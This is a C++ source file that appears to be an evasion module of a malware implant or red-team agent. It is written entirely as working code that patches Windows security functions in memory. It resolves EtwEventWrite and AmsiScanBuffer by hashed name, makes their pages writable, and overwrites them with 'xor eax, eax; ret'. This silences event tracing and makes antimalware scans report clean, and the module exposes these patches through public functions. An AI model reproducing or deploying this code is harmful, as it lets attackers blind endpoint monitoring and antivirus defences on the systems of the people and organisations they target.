#include <common.h>
#include <module.h>

#if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)

using namespace stardust;

namespace starburst {

#ifdef INCLUDE_EVASION_ETW
static auto declfn patch_etw( instance& inst ) -> bool {
    auto pEtwEventWrite = reinterpret_cast<uint8_t*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "EtwEventWrite" ) ) );

    if ( !pEtwEventWrite ) return false;

    DWORD old_protect = 0;
    if ( !inst.kernel32.VirtualProtect( pEtwEventWrite, 4,
            PAGE_READWRITE, &old_protect ) )
        return false;

    // xor eax, eax; ret - returns STATUS_SUCCESS, event silently dropped
    pEtwEventWrite[0] = 0x33;
    pEtwEventWrite[1] = 0xC0;
    pEtwEventWrite[2] = 0xC3;

    inst.kernel32.VirtualProtect( pEtwEventWrite, 4,
        old_protect, &old_protect );

    return true;
}
#endif // INCLUDE_EVASION_ETW

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
static auto declfn patch_amsi( instance& inst ) -> bool {
    auto h_amsi = inst.kernel32.LoadLibraryA(
        symbol<const char*>( "amsi.dll" ) );
    if ( !h_amsi ) return false;

    auto pAmsiScanBuffer = reinterpret_cast<uint8_t*>(
        resolve::_api( reinterpret_cast<uintptr_t>( h_amsi ),
            expr::hash_string( "AmsiScanBuffer" ) ) );
    if ( !pAmsiScanBuffer ) return false;

    DWORD old_protect = 0;
    if ( !inst.kernel32.VirtualProtect( pAmsiScanBuffer, 4,
            PAGE_READWRITE, &old_protect ) )
        return false;

    // xor eax, eax; ret — returns S_OK, scan result stays default (clean)
    pAmsiScanBuffer[0] = 0x33;
    pAmsiScanBuffer[1] = 0xC0;
    pAmsiScanBuffer[2] = 0xC3;

    inst.kernel32.VirtualProtect( pAmsiScanBuffer, 4,
        old_protect, &old_protect );

    return true;
}
#endif // INCLUDE_EVASION_AMSI && _WIN64

// ── Public API ──

#ifdef INCLUDE_EVASION_ETW
auto declfn evasion_patch_etw( instance& inst ) -> void {
    if ( inst.evasion.etw_patched ) return;
    inst.evasion.etw_patched = patch_etw( inst );
    DBG_PRINT( inst, "ETW patch: %s\n",
        inst.evasion.etw_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
auto declfn evasion_patch_amsi( instance& inst ) -> void {
    if ( inst.evasion.amsi_patched ) return;
    inst.evasion.amsi_patched = patch_amsi( inst );
    DBG_PRINT( inst, "AMSI patch: %s\n",
        inst.evasion.amsi_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

} // namespace starburst

#endif
